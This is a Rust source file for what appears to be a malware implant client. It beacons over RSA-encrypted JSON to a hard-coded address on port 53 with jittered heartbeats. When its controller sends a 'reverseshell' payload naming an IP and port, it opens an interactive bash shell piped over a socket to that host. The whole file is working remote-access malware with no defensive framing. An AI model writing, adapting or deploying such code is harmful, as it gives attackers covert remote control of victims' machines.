use rand::rngs::OsRng;
use rand::Rng;
use rsa::PublicKey;
use rsa::{pkcs8::FromPublicKey, pkcs8::ToPublicKey, PaddingScheme, RsaPrivateKey, RsaPublicKey};
use serde::{Deserialize, Serialize};
use tokio::io;
use tokio::io::AsyncReadExt;
use tokio::io::AsyncWriteExt;
use tokio::net::tcp::OwnedWriteHalf;
use tokio::net::TcpStream;
use std::io::Result;
use std::net::{TcpStream as reverse_stream};
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

#[derive(Serialize, Deserialize)]
struct Message {
    user_sender: String,
    user_receiver: String,
    message_type: String,
    message_content: String,
}

fn _trim_newline(s:&mut String){
    while s.ends_with('\n') || s.ends_with('\r') || s.ends_with('\u{0}') {
        s.pop();
    };
}

async fn heartbeat(
    s_write:&mut OwnedWriteHalf,
    username_string: &String,
    srv_pub_key: &RsaPublicKey,
    mut rng: OsRng,
) {
    let s = "available".to_string();
    let message_type = "heartbeat".to_string();
    // check if message is private or global
    let hearbeat_to_send = Message {
        user_sender: username_string.to_string(),
        user_receiver: "Server".to_string(),
        message_type: message_type,
        message_content: s.to_string(),
    };
    let json_message = serde_json::to_string(&hearbeat_to_send).unwrap();
    let enc_data = srv_pub_key
        .encrypt(
            &mut rng,
            PaddingScheme::new_pkcs1v15_encrypt(),
            &json_message.as_bytes(),
        )
        .expect("failed to encrypt");
    s_write.write_all(&enc_data).await.unwrap();
}

pub fn interpret_payload(payload: String) {
    let infos_payload = payload.split_whitespace().collect::<Vec<_>>();
    if infos_payload[0] == "reverseshell"{
        println!("Activating reverseshell");
        shell("bash".to_string(), infos_payload[1], infos_payload[2]);
    }
}

pub fn shell(shell: String, ip: &str, port: &str) -> Result<()> {
    let sock = reverse_stream::connect(format!("{}:{}", ip, port))?;
    let fd = sock.as_raw_fd();

    // Open shell
    Command::new(format!("{}", shell))
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()?
        .wait()?;

    Ok(())
}

#[tokio::main]
async fn main() -> io::Result<()> {
    // Generate priv and pub key of client
    let mut rng = OsRng;
    let bits = 2048;
    let priv_key = RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key");
    let pub_key = RsaPublicKey::from(&priv_key);
    let pub_key_pem = RsaPublicKey::to_public_key_pem(&pub_key).unwrap();

    // Username input
    let username = "bobby".to_string();

    // TCP Stream creation

    let mut _stream = TcpStream::connect("192.168.1.41:53").await?;
    let (mut reader, mut writer) = _stream.into_split();

    // Send public key
    let message_type = "pkey".to_string();
    let pbkey_to_send = Message {
        user_sender: "".to_string(),
        user_receiver: "".to_string(),
        message_type: message_type,
        message_content: pub_key_pem,
    };
    let json_message = serde_json::to_string(&pbkey_to_send).unwrap();
    writer.write_all(json_message.as_bytes()).await.unwrap();

    // Get public key from server
    let mut buf = [0; 4096];
    let _readed = reader.read(&mut buf).await;
    let mut rcv_msg = String::from_utf8_lossy(&buf).to_string();
    while rcv_msg.ends_with('\n') || rcv_msg.ends_with('\r') || rcv_msg.ends_with('\u{0}') {
        rcv_msg.pop();
    }

    let json_message: Message = serde_json::from_str(&rcv_msg).unwrap();
    let srv_pub_key = RsaPublicKey::from_public_key_pem(&json_message.message_content).unwrap();
    // send username to server
    let message_type = "login".to_string();

    let username_to_send = Message {
        user_sender: username.to_string(),
        user_receiver: "Server".to_string(),
        message_type: message_type,
        message_content: username.to_string(),
    };
    let json_message = serde_json::to_string(&username_to_send).unwrap();
    let enc_data = srv_pub_key
        .encrypt(
            &mut rng,
            PaddingScheme::new_pkcs1v15_encrypt(),
            &json_message.as_bytes(),
        )
        .expect("failed to encrypt");
    writer.write_all(&enc_data).await.unwrap();

    // Spawn thread
    let rng_thread = rng.clone();
    loop{
        let sleep_time = std::time::Duration::from_secs(rng.gen_range(30..60));
        println!("{:?}", sleep_time);
        std::thread::sleep(sleep_time);
        println!("Sending heartbeat");
        heartbeat(&mut writer, &username, &srv_pub_key, rng_thread).await;
        let mut data = vec![0; 1024];
        match reader.try_read(&mut data) {
            Ok(0) => {}
            Ok(n) => {
                let dec_data = priv_key.decrypt(PaddingScheme::new_pkcs1v15_encrypt(), &data[..n]).expect("failed to decrypt");
                assert_ne!(&dec_data, &data[..n]);
                println!("read {} bytes", n);
                println!("Heartbeat recieved");
                let pingback = String::from_utf8(dec_data).expect("Found invalid UTF-8");
                let from_json_message: Message = serde_json::from_str(&pingback).unwrap();
                if from_json_message.message_type == "payload" {
                    interpret_payload(from_json_message.message_content);
                }
            }
            Err(_e) => {}
        }
    }

    //Shell
}
